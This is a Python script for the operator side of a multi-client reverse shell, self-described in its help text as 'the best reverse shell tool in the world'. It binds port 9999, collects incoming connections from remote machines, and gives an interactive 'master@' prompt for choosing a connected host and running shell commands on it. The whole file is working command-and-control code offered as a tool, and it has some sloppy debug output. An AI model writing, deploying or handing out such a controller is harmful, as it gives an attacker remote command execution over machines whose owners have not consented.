import socket
from threading import Thread
import time
from colorama import Fore, Style, Back

allowedToWrite = True

all_connection = []

all_addresses = []

CONST_LEN = 14

def setFormat(data):
    i = str(len(data.encode()))
    if(int(i) > 9999):
        return "### special code ###"
    i = i.zfill(CONST_LEN)
    print(len(str(i).encode()))
    return i + data
# need to encode the return

# creating socket
def socket_create():
    try:
        global host
        global port
        global serverSock
        host = ''
        port = 9999
        serverSock = socket.socket()
    except socket.error as msg:
        print(Fore.RED + "Socket creation error: " + str(msg) + Fore.RESET)


# Bind socket to port and wait for connection
def socket_bind():
    try:
        global host
        global port
        global serverSock
        print(Fore.BLUE + "\nBinding socket to port " + str(port) + '\n' + Fore.RESET)
        serverSock.bind((host, port))
        serverSock.listen(5)#up to five false connection
    except socket.error as msg:
        print(Fore.RED + "\nSocket binding error: " + str(msg) + "\n" + "Retrying" + Fore.RESET)
        time.sleep(5)
        socket_bind()

# Accept connection from multiple clients and save to list

def accept_connection():
    for c in all_connection:
        c.close()
    del all_connection[:]
    del all_addresses[:]

    while True:
        try:
            i = 0
            conn, address = serverSock.accept()
            conn.setblocking(1)# check
            all_connection.append(conn)
            all_addresses.append(address)
            while(not allowedToWrite):
                i = i + 1
            print(Fore.GREEN + "\nConnection has been established to " + str(address) + Fore.RESET)
        except:
            print(Fore.RED + "Error accepting connections." + Fore.RESET)

# interctibe promt for sending commands
def start_master():
    while True:
        cmd = input(Fore.RESET + "master@ ")
        allowedToWrite = True
        if cmd == 'list':
            list_connections()#printting all connections, not created yet
        elif cmd == "help":
            printHelp()
        elif 'connect' in cmd:
            try:
                (conn, addr_index) = get_target(cmd)#return the connection
            except:
                continue
            if conn is not None:
                send_target_commands(conn, addr_index)
        else:
            print(Fore.RED + "Command not recognized." + Fore.RESET)


# Display all connection:
def list_connections():
    result = ''
    for i, conn in enumerate(all_connection):
        try:
            conn.send(str.encode(setFormat(' ')))
            len = int(conn.recv(CONST_LEN).decode())
            conn.recv(len)
        except:
            del all_connection[i]
            del all_addresses[i]
            continue
        result += str(i) + " : " + str(all_addresses[i]) +'\n'
    print(Fore.GREEN + " ---- Clients List ----- " + Fore.RESET)
    print(Fore.GREEN + result + Fore.RESET)
#        result += str(i) + '  ' + str(all_connection[i][0]) + '  ' + str(all_connection[i][1]) +'\n'

# Select a target client
def get_target(cmd):
    try:
        target = cmd.replace('connect ', '')
        target = int(target)
        if(target < 0):
            print(Fore.RED + "Not a valid selection." + Fore.RESET)
            return None
        conn = all_connection[target]
        print(Fore.GREEN + "You are now connected to " + str(all_addresses[target]) + Fore.RESET) # [0]
        print(Fore.GREEN + "------------------------------------------" + Fore.RESET)
        return (conn, target)
    except:
        print(Fore.RED + "Not a valid selection." + Fore.RESET)
        return None

# Ciinect wih remotes target client
def send_target_commands(conn, target):
    while True:
        try:
            cmd = input("master@" + str(all_addresses[target]) + '$ ')
            if cmd == "quit":
                print(Fore.GREEN + "You are now disconnecting from " + str(all_addresses[target]) + Fore.RESET)
                print(Fore.GREEN + "-----------------------------------" + Fore.RESET)
                return
            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(setFormat(cmd)))
                responseLen = int(conn.recv(CONST_LEN).decode())
                client_response = str(conn.recv(responseLen), "utf-8")
                print(Fore.GREEN + client_response + Fore.RESET)#, end=""
        except:
            print(Fore.RED + " Connection was lost. " + Fore.RESET)
            break

def threadFirstJob():
    socket_create()
    socket_bind()
    accept_connection()

def threadSecandJob():
    start_master()

def handleThread():
    print("crap")
    t1 = Thread(target=threadFirstJob)
    t1.deamon = True # die when main program exit
    t2 = Thread(target=threadSecandJob)
    t2.daemon = True

    t1.start() # Go
    print("123")
    time.sleep(0.5)

    t2.start()

def printHelp():
    print(Style.BRIGHT + Back.BLUE + Fore.RED + "---- Welcome to TALOS terminal ----" + Back.RESET + Style.RESET_ALL)
    print(Fore.CYAN + "Here at TALOS we give you the best reverse shell tool in the world")
    print(Fore.RED + "Disclaimer: the entire terminal is space and case sensitive" + Fore.RESET)
    print(Fore.CYAN + "Quick Manual: commands")
    print("list: listing all available connection, by format[id : conn]")
    print("help: printing help info")
    print("quit: disconnecting from a client" + Fore.RESET + Style.RESET_ALL)
    #print(Back.GREEN + "\n" + Back.RESET)

def main():
    handleThread()

if __name__ == '__main__':
    main()
